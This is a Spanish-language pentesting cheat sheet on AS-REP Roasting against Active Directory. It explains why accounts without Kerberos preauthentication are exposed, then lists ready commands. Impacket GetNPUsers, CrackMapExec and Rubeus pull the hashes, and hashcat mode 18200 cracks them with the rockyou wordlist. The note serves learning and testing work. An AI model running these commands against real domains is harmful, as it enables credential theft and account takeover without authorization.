# ASREProstable 

Tags: #AD #ASREProstable #Rubeus #Impacket #Crackmapexec #HashCat #Windows 

El "KRB_AS_REP Roasting" es un ataque dirigido a cuentas en dominios de Active Directory (AD) que tienen habilitada la opción "No requiere preautenticación de Kerberos". Esta configuración permite a un atacante solicitar un ticket de autenticación (AS-REP) sin proporcionar una preautenticación válida. El atacante puede capturar este ticket y descifrarlo fuera de línea para intentar recuperar las contraseñas en texto claro de las cuentas afectadas. Este método explota configuraciones inseguras y puede ser mitigado desactivando dicha propiedad en las cuentas y aplicando contraseñas fuertes junto con políticas de monitoreo.

* [CVE-2022-33679](https://infayer.com/archivos/1661)

```bash 
1. Preautenticación de Kerberos: Normalmente, Kerberos requiere que un usuario proporcione no solo su nombre de usuario sino también su contraseña para obtener un ticket TGT (Ticket Granting Ticket) durante el proceso de autenticación inicial (AS-REQ). Esta es una medida de seguridad diseñada para prevenir ataques de tipo "offline" en los que se intenta adivinar las contraseñas.
    
2. Cuentas sin Preautenticación: Sin embargo, en algunos casos, esta propiedad puede estar deshabilitada para ciertas cuentas debido a necesidades de compatibilidad o configuraciones erróneas. Esto significa que el KDC (Key Distribution Center) enviará la respuesta (AS-REP) que contiene el TGT cifrado sin requerir una prueba válida de conocimiento de la contraseña del usuario.

# Funcionamiento 

1. Enumeración de Usuarios: Un atacante primero enumerará las cuentas de usuario que tienen deshabilitada la preautenticación de Kerberos.
    
2. Solicitud de TGT: Luego, el atacante puede enviar una solicitud AS-REQ para esas cuentas y el KDC responderá con un AS-REP que contiene el TGT cifrado usando la contraseña del usuario.
    
3. Ataque Offline: A diferencia de un ataque de fuerza bruta online, el atacante puede ahora intentar descifrar el TGT offline, utilizando herramientas de cracking de contraseñas para adivinar la contraseña sin alertar al sistema o bloquear la cuenta de usuario.
```

## Explotar con Impacket

```bash 
# Ejemplo de un hash 

❯ $krb5asrep$23$asrep.user@domain1.corp:0939461A3CF12B34FC2EEDE8C8154E15$55613643FA62AB315871CFD9B90978AB2D3...
```

```bash 
❯ impacket-GetNPUsers 'domain1.corp/asrep.user' -no-pass -dc-ip 18.116.10.36 -request

	# domain1.corp/asrep.user = Usuario vulnerable o lista de usuarios 
	# no-pass = No hay una contraseña 
	# dc-ip = Ip del DC
```

## Explotar con CrackMapExec

```bash 
❯ ./cme ldap 18.116.10.36 -u 'clearpass.user' -p 'Password@1' --asreproast output.txt
```

## Explotar con Rubeus 

```powershell
❯ .\Rubeus.exe asreproast /user:asrep.user /format:hashcat /outfile:hashes.asreproast 

	# user = Usuario vulnerable
	# outfile = Exportar a un archivo 
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 18200 --force hashes.asreproast /usr/share/wordlists/rockyou.txt

	# m = Método por fuerza bruta
	# 18200 = Es un ASREProstable
	# hashes.asreproast = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```